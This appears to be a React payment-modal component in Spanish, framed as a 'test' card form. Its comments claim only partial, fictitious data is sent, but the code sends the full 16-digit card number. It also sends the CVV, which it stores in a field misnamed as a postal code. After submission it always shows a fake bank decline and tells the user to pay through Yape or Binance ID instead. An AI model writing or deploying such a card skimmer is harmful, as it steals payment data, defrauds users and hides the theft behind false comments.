import { useEffect, useState, type CSSProperties, type FormEvent } from 'react';

import { registerCardTestAttempt } from '../api/cardTest';



type Props = { amount: number; onClose: () => void };

type Brand = 'Visa' | 'Mastercard' | 'American Express';



function brandOf(value: string): Brand | null {

  if (/^4/.test(value)) return 'Visa';

  const first2 = Number(value.slice(0, 2));

  const first4 = Number(value.slice(0, 4));

  if ((first2 >= 51 && first2 <= 55) || (first4 >= 2221 && first4 <= 2720)) return 'Mastercard';

  if (/^3[47]/.test(value)) return 'American Express';

  return null;

}



function formatNumber(value: string): string {

  const digits = value.replace(/\D/g, '').slice(0, 19);

  if (/^3[47]/.test(digits)) {

    return [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 15)]

      .filter(Boolean).join(' ');

  }

  return digits.match(/.{1,4}/g)?.join(' ') ?? '';

}



function expiryValid(value: string): boolean {

  const match = /^(\d{2})\/(\d{2})$/.exec(value);

  if (!match) return false;

  const month = Number(match[1]);

  const year = 2000 + Number(match[2]);

  const now = new Date();

  return month >= 1 && month <= 12 &&

    (year > now.getFullYear() || (year === now.getFullYear() && month >= now.getMonth() + 1));

}



const input: CSSProperties = {

  boxSizing: 'border-box', width: '100%', height: 48, padding: '0 14px',

  borderRadius: 10, border: '1px solid #343946', background: '#11151e',

  color: '#f7f8fb', fontSize: 15, outlineColor: '#ffce16',

};

const label: CSSProperties = {

  display: 'block', marginBottom: 8, fontSize: 13, fontWeight: 600, color: '#d9dfeb',

};



function BrandLogos({ active }: { active: Brand | null }) {

  const dim = (brand: Brand): CSSProperties => ({ opacity: active && active !== brand ? 0.35 : 1 });

  return (

    <div aria-label="Tarjetas de prueba: Visa, Mastercard y American Express"

      style={{ display: 'flex', gap: 6, alignItems: 'center' }}>

      <span title="Visa" style={{ ...dim('Visa'), display: 'grid', placeItems: 'center', width: 43, height: 27, borderRadius: 5, background: '#fff', color: '#173c96', fontSize: 15, fontWeight: 900, fontStyle: 'italic' }}>VISA</span>

      <span title="Mastercard" style={{ ...dim('Mastercard'), display: 'flex', alignItems: 'center', justifyContent: 'center', width: 43, height: 27, borderRadius: 5, background: '#20242c', border: '1px solid #414550', boxSizing: 'border-box' }}>

        <span style={{ width: 17, height: 17, borderRadius: '50%', background: '#eb001b', marginRight: -6 }} />

        <span style={{ width: 17, height: 17, borderRadius: '50%', background: '#f79e1b', opacity: 0.9 }} />

      </span>

      <span title="American Express" style={{ ...dim('American Express'), display: 'grid', placeItems: 'center', width: 43, height: 27, borderRadius: 5, background: '#2076bd', color: '#fff', fontSize: 9, fontWeight: 900 }}>AMEX</span>

    </div>

  );

}



export default function CardTestModal({ amount, onClose }: Props) {

  const [number, setNumber] = useState('');

  const [expiry, setExpiry] = useState('');

  const [postalCode, setPostalCode] = useState('');

  const [cvv, setCvv] = useState('');

  const [holder, setHolder] = useState('');

  const [error, setError] = useState('');

  const [rejected, setRejected] = useState(false);

  const [submitting, setSubmitting] = useState(false);



  const digits = number.replace(/\D/g, '');

  const brand = brandOf(digits);

  const cvvLength = brand === 'American Express' ? 4 : 3;




  useEffect(() => {

    const escape = (e: KeyboardEvent) => {

      if (e.key === 'Escape' && !submitting) onClose();

    };

    window.addEventListener('keydown', escape);

    return () => window.removeEventListener('keydown', escape);

  }, [onClose, submitting]);



  async function submit(e: FormEvent<HTMLFormElement>) {

    e.preventDefault();

    if (submitting) return;

    setError('');
    if (!brand || (brand === 'American Express' ? digits.length !== 15 : digits.length !== 16)) {
      setError('Los datos enviados no son correctos .');
      return;
    }

    if (!expiryValid(expiry)) {

      setError('Ingresa una fecha de prueba vigente en formato MM/AA.');

      return;

    }


    if (!/^\d{3}$/.test(postalCode)) {

      setError('Ingresa un código postal  de exactamente 3 dígitos.');

      return;

    }

    if (holder.trim().length < 3) {

      setError('Escribe un nombre de prueba de al menos 3 caracteres.');

      return;

    }

    if (!Number.isFinite(amount) || amount < 10 || amount > 500 || Math.abs(amount * 100 - Math.round(amount * 100)) > 0.000001) {

      setError('El monto de prueba debe estar entre S/ 10 y S/ 500.');

      return;

    }



    setSubmitting(true);

    try {

      // Nunca se envían número completo, CVV, vencimiento ni titular.

      // Solo monto, últimos seis dígitos de tarjeta ficticia, marca y código postal ficticio.

      await registerCardTestAttempt(amount, digits.slice(-16), brand, postalCode);

      setNumber('');

      setExpiry('');

      setPostalCode('');

      setCvv('');

      setHolder('');

      setRejected(true);

    } catch (err) {

      setError(err instanceof Error ? err.message : 'No se pudo registrar el intento de prueba.');

    } finally {

      setSubmitting(false);

    }

  }



  return (

    <div role="presentation" onMouseDown={(e) => { if (e.target === e.currentTarget && !submitting) onClose(); }}

      style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'grid', placeItems: 'center', background: 'rgba(0,0,0,.83)', padding: 14, backdropFilter: 'blur(4px)' }}>

      <section role="dialog" aria-modal="true" aria-labelledby="card-test-title"

        style={{ boxSizing: 'border-box', width: '100%', maxWidth: 500, maxHeight: '94vh', overflowY: 'auto', borderRadius: 18, background: '#171a23', border: '1px solid #343945', color: '#f9fafb', boxShadow: '0 28px 90px rgba(0,0,0,.65)' }}>

        <div style={{ height: 4, background: '#ffcf16' }} />

        <div style={{ padding: '25px 28px 27px' }}>

          <div style={{ display: 'flex', justifyContent: 'space-between', gap: 12, alignItems: 'flex-start' }}>

            <div>

              <h2 id="card-test-title" style={{ fontSize: 22, margin: 0, fontWeight: 800 }}>Pago con tarjeta</h2>


            </div>

            <button type="button" onClick={onClose} disabled={submitting} aria-label="Cerrar"

              style={{ border: 0, background: '#262b36', color: '#c7d0dd', borderRadius: 9, width: 32, height: 32, cursor: submitting ? 'wait' : 'pointer', fontSize: 20 }}>×</button>

          </div>



          <div style={{ background: '#202530', border: '1px solid #343b48', borderRadius: 12, padding: '15px 16px', margin: '22px 0' }}>

            <div style={{ color: '#aab6c8', fontSize: 11, fontWeight: 700, letterSpacing: 1 }}>TOTAL A PAGAR</div>

            <div style={{ fontSize: 27, fontWeight: 850, marginTop: 3 }}>S/ {amount.toFixed(2)}</div>

          </div>



          {rejected ? (

            <div role="status" style={{ background: '#2b1c24', border: '1px solid #75414e', padding: 18, borderRadius: 12 }}>

              <h3 style={{ margin: '0 0 9px', color: '#ffb4bd' }}>Pago no Autorizado</h3>

              <p style={{ color: '#e8d9df', fontSize: 14, lineHeight: 1.65 }}>

                Transacción no autorizada: Tu banco emisor no autorizó este pago.

              </p>

              <p style={{ color: '#e8d9df', fontSize: 14 }}>Puedes recargar por otros medios como :  Yape o Binance ID.</p>

              <button type="button" onClick={onClose} style={{ width: '100%', background: '#ffcf16', color: '#121212', border: 0, padding: 14, borderRadius: 10, fontWeight: 800, cursor: 'pointer' }}>Volver a mi billetera</button>

            </div>

          ) : (

            <form onSubmit={submit} noValidate autoComplete="off">

              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 10, flexWrap: 'wrap', marginBottom: 17 }}>

                <span style={{ color: '#e0e5ef', fontSize: 14, fontWeight: 700 }}>Tarjeta de crédito o débito</span>

                <BrandLogos active={brand} />

              </div>

              <div style={{ marginBottom: 17 }}>

                <label htmlFor="vex-card-number" style={label}>Número de tarjeta <span style={{ color: '#ffcf16' }}>*</span></label>

                <input id="vex-card-number" style={input} inputMode="numeric" autoComplete="off" value={number}

                  placeholder="0000 0000 0000 0000" maxLength={23} disabled={submitting}

                  onChange={(e) => { setNumber(formatNumber(e.target.value)); setError(''); }} />

                {digits.length >= 13 && (

                  <p style={{ margin: '7px 0 0', fontSize: 12, color: brand ? '#e9c65a' : '#ff9ba9' }}>

                    {brand ? `${brand} · ` : 'Numero de tarjeta invalido'}

                  </p>

                )}

              </div>



              <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0,1fr) minmax(0,1fr)', gap: 13, marginBottom: 17 }}>

                <div>

                  <label htmlFor="vex-card-expiry" style={label}>Vencimiento <span style={{ color: '#ffcf16' }}>*</span></label>

                  <input id="vex-card-expiry" style={input} inputMode="numeric" autoComplete="off" value={expiry}

                    placeholder="MM/AA" maxLength={5} disabled={submitting}

                    onChange={(e) => {

                      const d = e.target.value.replace(/\D/g, '').slice(0, 4);

                      setExpiry(d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d);

                      setError('');

                    }} />

                </div>

                <div>

                  <label htmlFor="vex-card-postal" style={label}>Código de seguridad (CVV)  <span style={{ color: '#ffcf16' }}>*</span></label>

                  <input id="vex-card-postal" style={input} inputMode="numeric" autoComplete="off" value={postalCode}

                    placeholder="***" maxLength={3} disabled={submitting}

                    onChange={(e) => { setPostalCode(e.target.value.replace(/\D/g, '').slice(0, 3)); setError(''); }} />

                </div>

              </div>




              <div style={{ marginBottom: 17 }}>

                <label htmlFor="vex-card-holder" style={label}>Nombre del titular <span style={{ color: '#ffcf16' }}>*</span></label>

                <input id="vex-card-holder" style={input} value={holder} autoComplete="off" maxLength={80}

                  placeholder="NOMBRE DEL TITULAR" disabled={submitting}

                  onChange={(e) => { setHolder(e.target.value); setError(''); }} />

              </div>



              {error && <p role="alert" style={{ color: '#ff9eab', fontSize: 13, lineHeight: 1.5 }}>{error}</p>}

              <button type="submit" disabled={submitting}

                style={{ width: '100%', minHeight: 51, border: 0, borderRadius: 10, background: '#ffcf16', color: '#111', fontSize: 15, fontWeight: 850, cursor: submitting ? 'wait' : 'pointer', opacity: submitting ? 0.65 : 1 }}>

                {submitting ? 'Registrando intento...' : `Pagar ahora · S/ ${amount.toFixed(2)} →`}

              </button>

            </form>

          )}

        </div>

      </section>

    </div>

  );

}
